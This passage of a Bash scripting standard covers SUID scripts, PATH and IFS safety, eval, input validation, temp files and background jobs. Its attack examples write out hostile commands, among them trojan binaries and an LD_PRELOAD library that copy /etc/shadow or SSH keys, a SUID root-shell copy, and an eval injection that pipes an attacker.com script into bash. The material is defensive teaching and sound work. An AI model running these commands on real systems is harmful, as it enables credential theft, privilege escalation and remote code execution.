- **PATH Manipulation**: Kernel uses caller's `PATH` to find interpreter, enabling trojan attacks
- **Library Injection**: `LD_PRELOAD`/`LD_LIBRARY_PATH` inject code before script execution
- **Shell Expansion**: Multiple expansion phases (brace, tilde, parameter, command, glob) exploitable
- **Race Conditions**: TOCTOU vulnerabilities in file operations
- **No Compilation**: Script source readable/modifiable, increasing attack surface

**Why dangerous:** SUID changes effective UID to file owner during execution. For scripts, kernel reads shebang, executes interpreter with script as argument—interpreter inherits privileges and processes expansions. This multi-step process creates attack vectors absent in compiled programs.

**Anti-Patterns:**

**1. PATH Attack (interpreter resolution):**
```bash
# SUID script sets secure PATH internally—irrelevant
#!/bin/bash
PATH=/usr/bin:/bin
tar -czf /backup/data.tar.gz /var/data
```
Attack:
```bash
mkdir /tmp/evil
cat > /tmp/evil/bash << 'EOT'
#!/bin/bash
cp -r /root/.ssh /tmp/stolen_keys
exec /bin/bash "$@"
EOT
chmod +x /tmp/evil/bash
export PATH=/tmp/evil:$PATH
/usr/local/bin/backup.sh
# Kernel uses CALLER's PATH—malicious bash runs as root BEFORE script's PATH is set
```

**2. Library Injection:**
```bash
# Attacker creates malicious shared library
cat > /tmp/evil.c << 'EOT'
void __attribute__((constructor)) init(void) {
    if (geteuid() == 0) system("cp /etc/shadow /tmp/shadow_copy");
}
EOT
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh
# Library runs with root privileges before script
```

**3. Symlink Race Condition:**
```bash
# SUID script checks file existence then writes
if [[ -f "$output_file" ]]; then die 1 "File exists"; fi
# Race window here!
echo "secret data" > "$output_file"
```
Attack: Loop creating symlink to /etc/passwd in race window—script writes to /etc/passwd.

**Safe Alternatives:**

**1. sudo with configured permissions:**
```bash
# /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/myapp.sh
%admin ALL=(root) /usr/local/bin/backup.sh --backup-only
```

**2. Capabilities (compiled programs only):**
```bash
setcap cap_net_bind_service=+ep /usr/local/bin/myserver
# Grants specific privilege without full root
```

**3. Setuid wrapper (compiled C):**
```c
int main(int argc, char *argv[]) {
    setenv("PATH", "/usr/bin:/bin", 1);
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("IFS");
    execl("/usr/local/bin/backup.sh", "backup.sh", argv[1], NULL);
    return 1;
}
```

**4. systemd service:**
```
[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/myapp.sh
```

**Why sudo is safer:**
- Logging to /var/log/auth.log
- Credential timeout (15min)
- Granular control (commands, arguments, users)
- Environment sanitization (clears dangerous variables)
- Audit trail

**Detection:**
```bash
# Find SUID/SGID scripts (should return nothing)
find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \; | grep -i script
```

**Edge Cases:**

1. **Modern Linux kernels ignore SUID on scripts by default**—don't rely on this; many Unix variants still honor them, legacy systems may be vulnerable
2. **Capabilities don't work on scripts**—only compiled programs; use sudo/wrapper for scripts

**Key principle:** If you think you need SUID on a shell script, you're solving the wrong problem. Redesign using sudo, PolicyKit, systemd services, or a compiled wrapper.


---


**Rule: BCS1002**

## PATH Security

**Always secure PATH to prevent command substitution attacks and trojan binary injection.**

**Rationale:**
- Command Hijacking: Attacker-controlled directories allow malicious binaries to replace system commands
- Current Directory Risk: `.` or empty elements cause execution from current directory
- Privilege Escalation: Scripts with elevated privileges can execute attacker code
- Search Order: Earlier PATH directories searched first, enabling priority attacks
- Environment Inheritance: PATH inherited from potentially malicious caller environment

**Lock down PATH at script start:**

```bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - set secure PATH immediately
readonly -- PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
```

**Alternative: Validate existing PATH:**

```bash
# ✓ Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory' ||:
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element' ||:
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element' ||:
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element' ||:
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp' ||:
```

**Attack Example: Current Directory in PATH**

```bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOT'
#!/bin/bash
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
/bin/ls "$@"
EOT
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH
# Script executes /tmp/ls instead of /bin/ls
```

**Secure PATH Patterns:**

**Pattern 1: Complete lockdown (recommended):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

readonly -- PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH
```

**Pattern 2: Full command paths (maximum security):**

```bash
# Don't rely on PATH - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/bin/rm -rf /tmp/workdir
```

**Pattern 3: PATH validation with fallback:**

```bash
validate_path() {
  if [[ "$PATH" =~ \\.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly -- PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}
validate_path
```

**Pattern 4: Command verification:**

```bash
verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path
  actual_path=$(command -v "$cmd")
  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

verify_command tar /bin/tar
verify_command rm /bin/rm
```

**Anti-patterns:**

```bash
# ✗ Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
ls /etc  # Could execute trojan from caller's PATH

# ✗ Wrong - PATH includes current directory
export PATH=.:$PATH

# ✗ Wrong - PATH includes /tmp (world-writable)
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin

# ✗ Wrong - PATH includes user home directories
export PATH=/home/user/bin:$PATH

# ✗ Wrong - empty elements in PATH (all equal current directory)
export PATH=/usr/local/bin::/usr/bin:/bin
export PATH=:/usr/local/bin:/usr/bin:/bin
export PATH=/usr/local/bin:/usr/bin:/bin:

# ✗ Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
whoami  # Uses inherited PATH (dangerous!)
hostname
export PATH='/usr/bin:/bin'  # Too late!
```

**Edge case: Scripts needing custom paths:**

```bash
#!/bin/bash
set -euo pipefail

readonly -- BASE_PATH='/usr/local/bin:/usr/bin:/bin'
readonly -- APP_PATH='/opt/myapp/bin'
export PATH="$BASE_PATH:$APP_PATH"
readonly -- PATH

# Validate application path
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist ${APP_PATH@Q}"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable ${APP_PATH@Q}"
```

**Sudo and PATH:**

```bash
# sudo uses secure_path by default (/etc/sudoers)
# Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# ✓ Safe - script sets own PATH regardless
sudo /usr/local/bin/backup.sh
# Script overwrites PATH: readonly -- PATH='/usr/local/bin:/usr/bin:/bin'

# ✗ Don't configure: Defaults env_keep += "PATH"
```

**PATH security check function:**

```bash
check_path_security() {
  local -a issues=()
  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)') ||:
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element') ||:
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)') ||:
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element') ||:
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp') ||:

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi
  return 0
}
check_path_security || die 1 'PATH security validation failed'
```

**Summary:**
- Set PATH explicitly at script start, use `readonly PATH` to prevent modification
- Never include `.`, empty elements, `/tmp`, or user directories
- Use absolute paths for critical commands as defense in depth
- Check permissions on PATH directories (none should be world-writable)

**Key principle:** PATH is trusted implicitly by command execution. An attacker who controls your PATH controls which code runs.


---


**Rule: BCS1003**

## IFS Manipulation Safety

**Never trust or use inherited IFS values. Always protect IFS changes to prevent field splitting attacks and unexpected behavior.**

**Rationale:**
- **Security Vulnerability**: Attackers manipulate IFS in calling environment to exploit unprotected scripts
- **Field Splitting Exploits**: Malicious IFS causes word splitting at unexpected characters
- **Command Injection**: IFS manipulation with unquoted variables enables command execution
- **Global Side Effects**: Changing IFS without restoration breaks subsequent operations

**Understanding IFS:**

IFS (Internal Field Separator) controls word splitting during expansion. Default: `$' \t\n'` (space, tab, newline).

```bash
# Default IFS behavior
IFS=$' \t\n'  # Space, tab, newline (default)
data="one two three"
read -ra words <<< "$data"
# Result: words=("one" "two" "three")

# Custom IFS for CSV parsing
IFS=','
data="apple,banana,orange"
read -ra fruits <<< "$data"
# Result: fruits=("apple" "banana" "orange")
```

**Attack Example: Field Splitting Exploitation**

```bash
# Vulnerable script - doesn't protect IFS
process_files() {
  local -- file_list=$1
  local -a files
  read -ra files <<< "$file_list"  # Vulnerable: IFS could be manipulated
  for file in "${files[@]}"; do
    rm -- "$file"
  done
}

# Attack: attacker sets IFS='/' before calling script
# With IFS='/', read -ra splits on '/' not spaces!
# "temp1.txt temp2.txt" becomes single filename, not two
```

**Safe Pattern 1: One-Line IFS Assignment (Preferred)**

```bash
# ✓ Correct - IFS change applies only to single command
IFS=',' read -ra fields <<< "$csv_data"
# IFS is automatically reset after the read command

IFS=':' read -ra path_dirs <<< "$PATH"
# Most concise and safe pattern for single operations
```

**Safe Pattern 2: Local IFS in Function**

```bash
# ✓ Correct - use local to scope IFS change
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- IFS  # Make IFS local to this function

  IFS=','
  read -ra fields <<< "$csv_data"
  # IFS automatically restored when function returns
}
```

**Safe Pattern 3: Save and Restore IFS**

```bash
# ✓ Correct - save, modify, restore
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- saved_ifs

  saved_ifs="$IFS"
  IFS=','
  read -ra fields <<< "$csv_data"
  IFS="$saved_ifs"  # Restore immediately
}
```

**Safe Pattern 4: Subshell Isolation**

```bash
# ✓ Correct - IFS change isolated to subshell
(
  IFS=','
  some_command || return 1  # Subshell ensures IFS is restored
)
```

**Safe Pattern 5: Explicitly Set IFS at Script Start**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Defend against inherited malicious IFS
IFS=$' \t\n'  # Space, tab, newline (standard default)
readonly IFS  # Prevent modification
export IFS
```

**Edge Cases:**

```bash
# IFS with read -d (null-delimited input from find -print0)
while IFS= read -r -d '' file; do
  process "$file"
done < <(find . -type f -print0)

# Empty IFS disables field splitting entirely
IFS=''
data="one two three"
read -ra words <<< "$data"
# Result: words=("one two three")  # NOT split!

# Preserve leading/trailing whitespace
IFS= read -r line < file.txt
```

**Anti-patterns:**

```bash
# ✗ Wrong - modifying IFS without save/restore
IFS=','
read -ra fields <<< "$csv_data"
# IFS is now ',' for the rest of the script - BROKEN!

# ✗ Wrong - trusting inherited IFS
#!/bin/bash
set -euo pipefail
# No IFS protection - vulnerable to manipulation!
read -ra parts <<< "$user_input"

# ✓ Correct - set IFS explicitly
IFS=$' \t\n'
readonly IFS

# ✗ Wrong - forgetting to restore IFS in error cases
saved_ifs="$IFS"
IFS=','
some_command || return 1  # IFS not restored on error!
IFS="$saved_ifs"

# ✓ Correct - use subshell for error safety
(
  IFS=','
  some_command || return 1
)

# ✗ Wrong - modifying IFS globally for loop
IFS=$'\n'
for line in $(cat file.txt); do
  process "$line"
done
# Now ALL subsequent operations use wrong IFS!

# ✓ Correct - isolate IFS change
while IFS= read -r line; do
  process "$line"
done < file.txt
```

**Complete Safe Example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

IFS=$' \t\n'
readonly IFS
export IFS

parse_csv_line() {
  local -- csv_line=$1
  local -a fields

  # IFS applies only to this read command
  IFS=',' read -ra fields <<< "$csv_line"

  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

main() {
  parse_csv_line 'apple,banana,orange'
}

main "$@"

#fin
```

**Testing IFS Safety:**

```bash
test_ifs_safety() {
  local -- original_ifs="$IFS"
  IFS='/'  # Set malicious IFS

  parse_csv_line "apple,banana,orange"

  if [[ "$IFS" == "$original_ifs" ]]; then
    success 'IFS properly protected'
  else
    error 'IFS leaked - security vulnerability!'
    return 1
  fi
}
```

**Summary:**
- **Set IFS explicitly** at script start: `IFS=$' \t\n'; readonly IFS`
- **Use one-line assignment** for single commands: `IFS=',' read -ra fields <<< "$data"`
- **Use local IFS** in functions: `local -- IFS; IFS=','`
- **Use subshells** for error-safe isolation
- **Always restore IFS** if modifying globally
- **Never trust inherited IFS**


---


**Rule: BCS1004**

## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary.**

**Rationale:**
- **Code Injection**: `eval` executes arbitrary code with full script privileges—no sandboxing
- **Bypasses All Validation**: Sanitized input can still contain metacharacters enabling injection
- **Difficult to Audit**: Dynamic code construction prevents security review
- **Better Alternatives Exist**: Arrays, indirect expansion, and associative arrays cover nearly all use cases

**Understanding eval:**

`eval` performs all expansions on a string, then executes the result—double expansion is the danger:

```bash
var='$(whoami)'
eval "echo $var"  # First: echo $(whoami) �' Second: executes whoami!
```

**Attack Example 1: Direct Command Injection**

```bash
# VULNERABLE - user_input executed directly
eval "$user_input"
```

**Attack:**
```bash
./script.sh 'curl https://attacker.com/backdoor.sh | bash'
./script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
```

**Attack Example 2: Variable Name Injection**

```bash
# VULNERABLE - seems safe but isn't
eval "$var_name='$var_value'"
```

**Attack:**
```bash
./script.sh 'x=$(rm -rf /important/data)' 'ignored'
# Executes: x=$(rm -rf /important/data)='ignored'
```

**Attack Example 3: Log Injection**

```bash
# VULNERABLE logging function
log_event() {
  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
  eval "$log_template"
}
```

**Attack:**
```bash
./script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
# Executes three commands including the malicious cat
```

**Safe Alternative 1: Arrays for Command Construction**

```bash
# ✓ Correct - no eval needed
build_find_command() {
  local -a cmd=(find "$search_path" -type f -name "$file_pattern")
  "${cmd[@]}"
}
```

**Safe Alternative 2: Indirect Expansion for Variable References**

```bash
# ✗ Wrong
eval "value=\\$$var_name"

# ✓ Correct - read variable
echo "${!var_name}"

# ✓ Correct - assign variable
printf -v "$var_name" '%s' "$value"
```

**Safe Alternative 3: Associative Arrays for Dynamic Data**

```bash
# ✗ Wrong
for i in {1..5}; do
  eval "var_$i='value $i'"
done

# ✓ Correct
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done
echo "${data[var_3]}"
```

**Safe Alternative 4: Case/Arrays for Function Dispatch**

```bash
# ✗ Wrong
eval "${action}_function"

# ✓ Correct - case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Correct - associative array
declare -A actions=([start]=start_function [stop]=stop_function)
if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
fi
```

**Safe Alternative 5: Direct Command Substitution**

```bash
# ✗ Wrong
eval "output=\$($cmd)"

# ✓ Correct - array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Validated Parsing**

```bash
# ✗ Wrong
eval "$config_line"  # PORT=8080

# ✓ Correct - validate key before assignment
IFS='=' read -r key value <<< "$config_line"
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
fi
```

**Edge Cases:**

**Dynamic variable names in loops:**
```bash
# Use associative array instead
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
```

**Building complex commands:**
```bash
# ✗ Wrong - string concatenation with eval
cmd="find /data -type f"
[[ -n "$pattern" ]] && cmd="$cmd -name '$pattern'"
eval "$cmd"

# ✓ Correct - array
declare -a cmd=(find /data -type f)
[[ -n "$pattern" ]] && cmd+=(-name "$pattern")
"${cmd[@]}"
```

**Anti-patterns:**

```bash
# ✗ eval with user input �' ✓ whitelist with case
eval "$user_command"
case "$user_command" in
  start|stop) systemctl "$user_command" myapp ;;
esac

# ✗ eval for variable assignment �' ✓ printf -v
eval "$var_name='$var_value'"
printf -v "$var_name" '%s' "$var_value"

# ✗ eval to check if variable set �' ✓ -v test
eval "if [[ -n \\$$var_name ]]; then echo set; fi"
if [[ -v "$var_name" ]]; then echo set; fi

# ✗ double expansion �' ✓ indirect expansion
eval "echo \$$var_name"
echo "${!var_name}"
```

**Detecting eval usage:**

```bash
grep -rn 'eval.*\$' /path/to/scripts/  # Find dangerous eval
shellcheck -x script.sh                 # SC2086 warns about eval
```

**Summary:**
- **Never use eval with untrusted input**—no exceptions
- **Use arrays** for dynamic commands: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion**: `${!var_name}`
- **Use associative arrays**: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch
- **Key principle:** If you think you need `eval`, you're solving the wrong problem


---


**Rule: BCS1005**

## Input Sanitization

**Always validate and sanitize user input to prevent security issues.**

**Rationale:**
- Prevent injection attacks, directory traversal (`../../../etc/passwd`)
- Validate data types/format, fail early, defense in depth—never trust user input

**1. Filename validation:**

```bash
sanitize_filename() {
  local -- name=$1

  [[ -n "$name" ]] || die 22 'Filename cannot be empty'

  name="${name//\.\./}"  # Remove all ..
  name="${name//\//}"    # Remove all /

  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || die 22 "Invalid filename ${name@Q}: contains unsafe characters"
  [[ "$name" =~ ^\\. ]] && die 22 "Filename cannot start with dot ${name@Q}"
  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars) ${name@Q}"

  echo "$name"
}

user_filename=$(sanitize_filename "$user_input")
safe_path="$SAFE_DIR/$user_filename"
```

**2. Numeric input validation:**

```bash
validate_positive_integer() {
  local -- input=$1
  [[ -n "$input" ]] || die 22 'Number cannot be empty'
  [[ "$input" =~ ^[0-9]+$ ]] || die 22 "Invalid positive integer: '$input'"
  [[ "$input" =~ ^0[0-9] ]] && die 22 "Number cannot have leading zeros: $input"
  echo "$input"
}

validate_port() {
  local -- port=$1
  port=$(validate_positive_integer "$port")
  ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
  echo "$port"
}
```

**3. Path validation:**

```bash
validate_path() {
  local -- input_path=$1
  local -- allowed_dir=$2

  local -- real_path
  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path ${input_path@Q}"

  [[ "$real_path" != "$allowed_dir"* ]] && die 5 "Path outside allowed directory ${real_path@Q}"

  echo "$real_path"
}

safe_path=$(validate_path "$user_path" "/var/app/data")
```

**4. Email/URL validation:**

```bash
validate_email() {
  local -- email=$1
  [[ -n "$email" ]] || die 22 'Email cannot be empty'
  local -- email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
  [[ "$email" =~ $email_regex ]] || die 22 "Invalid email format: $email"
  ((${#email} <= 254)) || die 22 "Email too long (max 254 chars): $email"
  echo "$email"
}

validate_url() {
  local -- url=$1
  [[ -n "$url" ]] || die 22 'URL cannot be empty'
  [[ "$url" =~ ^https?:// ]] || die 22 "URL must start with http:// or https://: ${url@Q}"
  [[ "$url" =~ @ ]] && die 22 'URL cannot contain credentials'
  echo "$url"
}
```

**5. Whitelist validation:**

```bash
validate_choice() {
  local -- input=$1
  shift
  local -a valid_choices=("$@")

  local choice
  for choice in "${valid_choices[@]}"; do
    [[ "$input" == "$choice" ]] && return 0
  done

  die 22 "Invalid choice ${input@Q}. Valid: ${valid_choices[*]}"
}

declare -a valid_actions=('start' 'stop' 'restart' 'status')
validate_choice "$user_action" "${valid_actions[@]}"
```

**6. Username validation:**

```bash
validate_username() {
  local -- username=$1
  [[ -n "$username" ]] || die 22 'Username cannot be empty'
  [[ "$username" =~ ^[a-z_][a-z0-9_-]*$ ]] || die 22 "Invalid username ${username@Q}"
  ((${#username} >= 1 && ${#username} <= 32)) || die 22 "Username must be 1-32 characters ${username@Q}"
  echo "$username"
}
```

**7. Command/option injection prevention:**

```bash
# ✗ DANGEROUS - command injection
user_file=$1
cat "$user_file"  # If user_file="; rm -rf /", disaster!

# ✓ Safe - validate first, use -- separator
validate_filename "$user_file"
cat -- "$user_file"

# ✗ DANGEROUS - eval with user input
eval "$user_command"  # NEVER DO THIS!

# ✓ Safe - whitelist allowed commands
case "$user_command" in
  start|stop|restart) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac

# Option injection - use -- or ./ prefix
rm -- "$user_file"
ls ./"$user_file"
```

**8. SQL injection prevention:**

```bash
# ✗ DANGEROUS
user_id=$1
query="SELECT * FROM users WHERE id=$user_id"  # user_id="1 OR 1=1"

# ✓ Safe - validate input type first
user_id=$(validate_positive_integer "$user_id")
query="SELECT * FROM users WHERE id=$user_id"
```

**Anti-patterns:**

```bash
# ✗ WRONG - trusting user input
rm -rf "$user_dir"  # user_dir="/" = disaster!

# ✓ Correct - validate first
validate_path "$user_dir" "/safe/base/dir"
rm -rf "$user_dir"

# ✗ WRONG - blacklist approach (always incomplete)
[[ "$input" != *'rm'* ]] || die 1 'Invalid input'  # Can be bypassed!

# ✓ Correct - whitelist approach
[[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
```

**Security principles:**
1. **Whitelist over blacklist**: Define what IS allowed, not what isn't
2. **Validate early**: Check input before any processing
3. **Fail securely**: Reject invalid input with clear error
4. **Use `--` separator**: Prevent option injection in commands
5. **Never use `eval`**: Especially not with user input
6. **Absolute paths**: Prevent PATH manipulation
7. **Least privilege**: Run with minimum necessary permissions


---


**Rule: BCS1006**

## Temporary File Handling

**Always use `mktemp` to create temporary files and directories, never hard-code temp file paths. Use trap handlers to ensure cleanup occurs even on script failure or interruption.**

**Rationale:**
- **Security**: mktemp creates files with secure permissions (0600) atomically, preventing race conditions
- **Uniqueness**: Guaranteed unique filenames prevent collisions with other processes
- **Cleanup Guarantee**: EXIT trap ensures cleanup even when script fails or is interrupted
- **Portability**: mktemp works consistently across Unix-like systems using TMPDIR or /tmp

**Basic temp file creation:**

```bash
# ✓ CORRECT - Create temp file and ensure cleanup
create_temp_file() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  echo 'Test data' > "$temp_file"
}
```

**Basic temp directory creation:**

```bash
# ✓ CORRECT - Create temp directory and ensure cleanup
create_temp_dir() {
  local -- temp_dir

  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'
  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  echo 'file1' > "$temp_dir"/file1.txt
}
```

**Custom temp file templates:**

```bash
# Template: myapp.XXXXXX (at least 3 X's required)
temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX) ||
  die 1 'Failed to create temporary file'

# Temp file with extension (mktemp doesn't support extensions directly)
temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
mv "$temp_file" "$temp_file".json
temp_file="$temp_file".json
```

**Multiple temp files with cleanup function:**

```bash
declare -a TEMP_FILES=()

cleanup_temp_files() {
  local -i exit_code=$?
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file" ||:
    [[ -d "$file" ]] && rm -rf "$file" ||:
  done

  return "$exit_code"
}

trap cleanup_temp_files EXIT

create_temp() {
  local -- temp_file
  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  TEMP_FILES+=("$temp_file")
  echo "$temp_file"
}
```

**Secure temp file with validation:**

```bash
secure_temp_file() {
  local -- temp_file

  if ! temp_file=$(mktemp 2>&1); then
    die 1 "Failed to create temporary file ${temp_file@Q}"
  fi

  # Validate temp file exists and is regular file
  [[ -f "$temp_file" ]] || die 1 "Temp file does not exist ${temp_file@Q}"

  # Check permissions (should be 0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file
  echo "$temp_file"
}
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - Hard-coded temp file path (collisions, predictable, no cleanup)
temp_file=/tmp/myapp_temp.txt

# ✗ WRONG - Using PID in filename (still predictable, race condition)
temp_file=/tmp/myapp_"$$".txt

# ✗ WRONG - No cleanup trap (temp file remains if script fails)
temp_file=$(mktemp)
echo 'data' > "$temp_file"

# ✗ WRONG - Cleanup in script body, not trap (cleanup skipped on failure)
temp_file=$(mktemp)
echo 'data' > "$temp_file"
rm -f "$temp_file"

# ✗ WRONG - Multiple traps overwrite each other
temp1=$(mktemp)
trap 'rm -f "$temp1"' EXIT
temp2=$(mktemp)
trap 'rm -f "$temp2"' EXIT  # Overwrites previous trap!

# ✓ CORRECT - Single trap for all cleanup
temp1=$(mktemp) || die 1 'Failed to create temp file'
temp2=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp1" "$temp2"' EXIT

# ✗ WRONG - Insecure permissions
chmod 666 "$temp_file"  # World writable!

# ✗ WRONG - Not checking mktemp success
temp_file=$(mktemp)
echo 'data' > "$temp_file"  # May fail if mktemp failed!

# ✗ WRONG - Removing temp directory without -r
trap 'rm "$temp_dir"' EXIT  # Fails if directory not empty!

# ✓ CORRECT - Use -rf for directories
trap 'rm -rf "$temp_dir"' EXIT
```

**Edge Cases:**

**1. Preserving temp files for debugging:**

```bash
declare -i KEEP_TEMP=0

cleanup() {
  local -i exit_code=$?

  if ((KEEP_TEMP)); then
    info 'Keeping temp files for debugging:'
    for file in "${TEMP_FILES[@]}"; do
      info "  $file"
    done
  else
    for file in "${TEMP_FILES[@]}"; do
      [[ -f "$file" ]] && rm -f "$file" ||:
      [[ -d "$file" ]] && rm -rf "$file" ||:
    done
  fi

  return "$exit_code"
}
```

**2. Signal handling for cleanup on interruption:**

```bash
# Cleanup on normal exit and signals
trap cleanup EXIT SIGINT SIGTERM
```

**3. Temp files in specific directory:**

```bash
temp_file=$(mktemp "$SCRIPT_DIR"/temp.XXXXXX) ||
  die 1 'Failed to create temp file in script directory'

temp_dir=$(mktemp -d "$HOME"/work/temp.XXXXXX) ||
  die 1 'Failed to create temp directory'
```

**Summary:**

| Requirement | Implementation |
|-------------|----------------|
| Always use mktemp | Never hard-code temp file paths |
| EXIT trap mandatory | Automatic cleanup when script ends |
| Check mktemp success | `\|\| die` to handle creation failure |
| Secure permissions | mktemp creates 0600 files, 0700 directories |
| Multiple temp files | Use array + cleanup function pattern |
| Signal handling | trap SIGINT SIGTERM for interruption cleanup |
| Debug support | --keep-temp option to preserve files |

**Key principle:** The combination of mktemp + trap EXIT is the gold standard for temp file handling - it's atomic, secure, and guarantees cleanup even when scripts fail or are interrupted.


---


**Rule: BCS1100**

# Concurrency & Jobs

Parallel execution patterns, background job management, and robust waiting strategies for Bash 5.2+.

**5 Rules:**

1. **Background Jobs** (BCS1101) - Managing `&`, process groups, and cleanup
2. **Parallel Execution** (BCS1102) - Running tasks concurrently with output capture
3. **Wait Patterns** (BCS1103) - `wait -n`, error collection, selective waiting
4. **Timeout Handling** (BCS1104) - Using `timeout` command, exit codes 124/125
5. **Exponential Backoff** (BCS1105) - Retry patterns with increasing delays

**Key principle:** Always clean up background jobs and handle partial failures gracefully.


---


**Rule: BCS1101**

## Background Job Management

**Rule: BCS1101**

Managing background processes, job control, and process lifecycle.

---

#### Rationale

Background jobs enable non-blocking execution, parallel processing, responsive scripts handling multiple tasks, and proper resource cleanup on termination.

---

#### Starting Background Jobs

```bash
# Basic background execution
long_running_command &
declare -i pid=$!

# Track multiple jobs
declare -a pids=()
for file in "${files[@]}"; do
  process_file "$file" &
  pids+=($!)
done
```

#### Checking Process Status

```bash
# Check if process is running (signal 0 = existence check)
if kill -0 "$pid" 2>/dev/null; then
  info "Process $pid is still running"
fi

# Get process state from /proc
if [[ -d /proc/"$pid" ]]; then
  state=$(< /proc/"$pid"/stat)
fi
```

#### Waiting for Jobs

```bash
wait "$pid"        # Wait for specific PID
exit_code=$?
wait               # Wait for all background jobs
wait -n            # Wait for any job to complete (Bash 4.3+)
```

#### Cleanup Pattern

```bash
declare -a PIDS=()

cleanup() {
  local -i exitcode=${1:-0}
  trap - SIGINT SIGTERM EXIT  # Prevent recursion

  # Kill any remaining background jobs
  for pid in "${PIDS[@]}"; do
    kill "$pid" 2>/dev/null || true
  done

  exit "$exitcode"
}
trap 'cleanup $?' SIGINT SIGTERM EXIT

# Start jobs
for task in "${tasks[@]}"; do
  run_task "$task" &
  PIDS+=($!)
done

# Wait for completion
for pid in "${PIDS[@]}"; do
  wait "$pid" || true
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no PID tracking (cannot manage later)
command &

# ✓ Correct - always track PIDs
command &
pid=$!

# ✗ Wrong - $$ is parent PID, not child
command &
echo "Started $$"

# ✓ Correct - use $! for last background PID
command &
echo "Started $!"
```

---

